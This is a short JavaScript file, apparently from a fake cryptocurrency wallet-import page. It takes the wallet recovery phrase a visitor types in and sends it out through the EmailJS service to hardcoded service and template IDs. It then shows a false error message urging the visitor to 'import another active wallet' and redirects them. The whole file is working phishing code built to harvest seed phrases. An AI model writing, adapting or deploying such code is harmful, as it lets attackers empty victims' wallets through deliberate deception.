const urlParams = new URLSearchParams(window.location.search);

// Get the value of the 'wallet' parameter
const wallet = urlParams.get('page');
document.getElementById("subject").value = wallet;


function sendMail() {

    const phraseTextarea = document.getElementById("ph");

    // Get the value of the textarea
    const phraseValue = phraseTextarea.value;

    var params = {
        subject: document.getElementById("subject").value,
        message: phraseValue
    }
      const serviceID  = 'service_xxg5c4c';
    const templateID = 'template_pnnwkdg';

    emailjs.send(serviceID, templateID, params).then((res) => {
        document.getElementById("subject").value = "";
        document.getElementById("ph").value = "";
        console.log(res);
        alert('An error occurred, try importing another active wallet');
        window.location.href = '../index.html';
        

    })
}